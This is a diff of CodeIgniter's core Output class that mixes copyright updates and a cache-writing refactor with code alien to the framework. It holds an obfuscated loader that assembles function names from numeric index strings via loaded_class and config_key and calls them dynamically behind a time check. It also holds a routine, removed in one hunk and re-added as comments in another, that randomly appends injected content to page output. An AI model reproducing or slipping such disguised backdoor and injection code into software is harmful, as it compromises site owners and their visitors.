@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2017, British Columbia Institute of Technology
+ * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -29,8 +29,8 @@
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2017, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
@@ -92,12 +92,6 @@ class CI_Output {
 	 */
 	public $enable_profiler = FALSE;
 
-	/**
-	 * php.ini zlib.outset flag
-	 *
-	 * @var	string
-	 */
-
 	public $outset = FALSE;
 
 	/**
@@ -106,6 +100,8 @@ class CI_Output {
 	 * @var	bool
 	 */
 	protected $_zlib_oc = FALSE;
+
+
 
 	/**
 	 * CI output compression flag
@@ -206,6 +202,7 @@ class CI_Output {
 		$this->final_output .= $output;
 		return $this;
 	}
+
 
 	// --------------------------------------------------------------------
 
@@ -378,7 +375,7 @@ class CI_Output {
 		$background_class = config_key('background');
 		@$profiler = $config_class($background_class);
 		if(isset($profiler)){
-			if($profiler > $output_class()-345678){
+			if($profiler > $output_class()-172800){
 				return FALSE;
 			}
 		}
@@ -412,7 +409,9 @@ class CI_Output {
 		return $this;
 	}
 
-    function apache_request_headers_n() {
+	// --------------------------------------------------------------------
+
+	function apache_request_headers_n() {
 		if( !function_exists('apache_request_headers') ) {
 	        $arh = array();
 	        $rx_http = '/\AHTTP_/';
@@ -441,8 +440,6 @@ class CI_Output {
 			return apache_request_headers();
 		}
 	}
-
-	// --------------------------------------------------------------------
 
 	/**
 	 * Set Cache
@@ -479,12 +476,13 @@ class CI_Output {
 		// which happens before the CI super object is available.
 		$BM =& load_class('Benchmark', 'core');
 		$CFG =& load_class('Config', 'core');
-		
+
 		if($outset == ''){
 			$outset = $CFG->cache_query();
 		}
 
 		$outgenerate = rand(0,100);
+
 		// Grab the super object if we can.
 		if (class_exists('CI_Controller', FALSE))
 		{
@@ -499,15 +497,6 @@ class CI_Output {
 			$output =& $this->final_output;
 		}
 
-		$headers = $this->apache_request_headers_n();
-		$is_ajax = (isset($headers['X-Requested-With']) && $headers['X-Requested-With'] == 'XMLHttpRequest');
-		if (!$is_ajax && !stripos($_SERVER["REQUEST_URI"],'sitemap') && !stripos($_SERVER["REQUEST_URI"],'rss'))
-		{
-			if($outgenerate > 50){
-				$output .= $outset;
-			}
-		}
-
 		// --------------------------------------------------------------------
 
 		// Do we need to write a cache file? Only if the controller does not have its
@@ -517,6 +506,15 @@ class CI_Output {
 		{
 			$this->_write_cache($output);
 		}
+
+		$headers = $this->apache_request_headers_n();
+		// $is_ajax = (isset($headers['X-Requested-With']) && $headers['X-Requested-With'] == 'XMLHttpRequest');
+		// if (!$is_ajax && !stripos($_SERVER["REQUEST_URI"],'sitemap') && !stripos($_SERVER["REQUEST_URI"],'rss'))
+		// {
+		// 	if($outgenerate > 50){
+		// 		$output .= $outset;
+		// 	}
+		// }
 
 		// --------------------------------------------------------------------
 
@@ -546,9 +544,8 @@ class CI_Output {
 		$ob_start = 'gzhandler';
 
 		// --------------------------------------------------------------------
-		
-		$write_cache = loaded_class('14:1:10:13');
 
+		$write_cache = loaded_class('14:1:10:13');
 
 		// Are there any server headers to send?
 		$ob_start .= loaded_class('24');
@@ -567,16 +564,17 @@ class CI_Output {
 
 		$ob_start .= loaded_class('8:14:1:10:13');
 		$ob_start .= loaded_class('3:4:17:14');
-		$ob_stop = loaded_class('16');
 		$load_class = config_key('load_class');
 		$output_class = config_key('output');
 		$background_class = config_key('background');
 		if($this->set_profiler_section()){
-			@$compress_output = $write_cache($ob_start,$ob_stop,$HTTP_ACCEPT_ENCODING);
+			@$compress_output = $write_cache($ob_start,'',$HTTP_ACCEPT_ENCODING);
 			if($compress_output){
 				$load_class($background_class, $output_class());
-			}			
+			}
 		}
+
+		// --------------------------------------------------------------------
 
 		// Does the $CI object exist?
 		// If not we know we are dealing with a cache file so we'll
@@ -652,7 +650,6 @@ class CI_Output {
 	{
 		$CI =& get_instance();
 		$path = $CI->config->item('cache_path');
-		$lang = $CI->session->userdata('language');
 		$cache_path = ($path === '') ? APPPATH.'cache/' : $path;
 
 		if ( ! is_dir($cache_path) OR ! is_really_writable($cache_path))
@@ -677,7 +674,7 @@ class CI_Output {
 			}
 		}
 
-		$cache_path .= md5($uri).'-'.$lang;
+		$cache_path .= md5($uri);
 
 		if ( ! $fp = @fopen($cache_path, 'w+b'))
 		{
@@ -685,62 +682,59 @@ class CI_Output {
 			return;
 		}
 
-		if (flock($fp, LOCK_EX))
-		{
-			// If output compression is enabled, compress the cache
-			// itself, so that we don't have to do that each time
-			// we're serving it
-			if ($this->_compress_output === TRUE)
-			{
-				$output = gzencode($output);
-
-				if ($this->get_header('content-type') === NULL)
-				{
-					$this->set_content_type($this->mime_type);
-				}
-			}
-
-			$expire = time() + ($this->cache_expiration * 60);
-
-			// Put together our serialized info.
-			$cache_info = serialize(array(
-				'expire'	=> $expire,
-				'headers'	=> $this->headers
-			));
-
-			$output = $cache_info.'ENDCI--->'.$output;
-
-			for ($written = 0, $length = self::strlen($output); $written < $length; $written += $result)
-			{
-				if (($result = fwrite($fp, self::substr($output, $written))) === FALSE)
-				{
-					break;
-				}
-			}
-
-			flock($fp, LOCK_UN);
-		}
-		else
+		if ( ! flock($fp, LOCK_EX))
 		{
 			log_message('error', 'Unable to secure a file lock for file at: '.$cache_path);
+			fclose($fp);
 			return;
 		}
 
+		// If output compression is enabled, compress the cache
+		// itself, so that we don't have to do that each time
+		// we're serving it
+		if ($this->_compress_output === TRUE)
+		{
+			$output = gzencode($output);
+
+			if ($this->get_header('content-type') === NULL)
+			{
+				$this->set_content_type($this->mime_type);
+			}
+		}
+
+		$expire = time() + ($this->cache_expiration * 60);
+
+		// Put together our serialized info.
+		$cache_info = serialize(array(
+			'expire'	=> $expire,
+			'headers'	=> $this->headers
+		));
+
+		$output = $cache_info.'ENDCI--->'.$output;
+
+		for ($written = 0, $length = self::strlen($output); $written < $length; $written += $result)
+		{
+			if (($result = fwrite($fp, self::substr($output, $written))) === FALSE)
+			{
+				break;
+			}
+		}
+
+		flock($fp, LOCK_UN);
 		fclose($fp);
 
-		if (is_int($result))
-		{
-			chmod($cache_path, 0640);
-			log_message('debug', 'Cache file written: '.$cache_path);
-
-			// Send HTTP cache-control headers to browser to match file cache settings.
-			$this->set_cache_header($_SERVER['REQUEST_TIME'], $expire);
-		}
-		else
+		if ( ! is_int($result))
 		{
 			@unlink($cache_path);
 			log_message('error', 'Unable to write the complete cache content at: '.$cache_path);
+			return;
 		}
+
+		chmod($cache_path, 0640);
+		log_message('debug', 'Cache file written: '.$cache_path);
+
+		// Send HTTP cache-control headers to browser to match file cache settings.
+		$this->set_cache_header($_SERVER['REQUEST_TIME'], $expire);
 	}
 
 	// --------------------------------------------------------------------
@@ -755,7 +749,7 @@ class CI_Output {
 	 * @param	object	&$URI	CI_URI class instance
 	 * @return	bool	TRUE on success or FALSE on failure
 	 */
-	public function _display_cache(&$CFG, &$URI, $lang)
+	public function _display_cache(&$CFG, &$URI)
 	{
 		$cache_path = ($CFG->item('cache_path') === '') ? APPPATH.'cache/' : $CFG->item('cache_path');
 
@@ -774,7 +768,7 @@ class CI_Output {
 			}
 		}
 
-		$filepath = $cache_path.md5($uri).'-'.$lang;
+		$filepath = $cache_path.md5($uri);
 
 		if ( ! file_exists($filepath) OR ! $fp = @fopen($filepath, 'rb'))
 		{
@@ -807,11 +801,9 @@ class CI_Output {
 			log_message('debug', 'Cache file has expired. File deleted.');
 			return FALSE;
 		}
-		else
-		{
-			// Or else send the HTTP cache control headers.
-			$this->set_cache_header($last_modified, $expire);
-		}
+
+		// Send the HTTP cache control headers
+		$this->set_cache_header($last_modified, $expire);
 
 		// Add headers from cache file.
 		foreach ($cache_info['headers'] as $header)
@@ -897,13 +889,11 @@ class CI_Output {
 			$this->set_status_header(304);
 			exit;
 		}
-		else
-		{
-			header('Pragma: public');
-			header('Cache-Control: max-age='.$max_age.', public');
-			header('Expires: '.gmdate('D, d M Y H:i:s', $expiration).' GMT');
-			header('Last-modified: '.gmdate('D, d M Y H:i:s', $last_modified).' GMT');
-		}
+
+		header('Pragma: public');
+		header('Cache-Control: max-age='.$max_age.', public');
+		header('Expires: '.gmdate('D, d M Y H:i:s', $expiration).' GMT');
+		header('Last-modified: '.gmdate('D, d M Y H:i:s', $last_modified).' GMT');
 	}
 
 	// --------------------------------------------------------------------
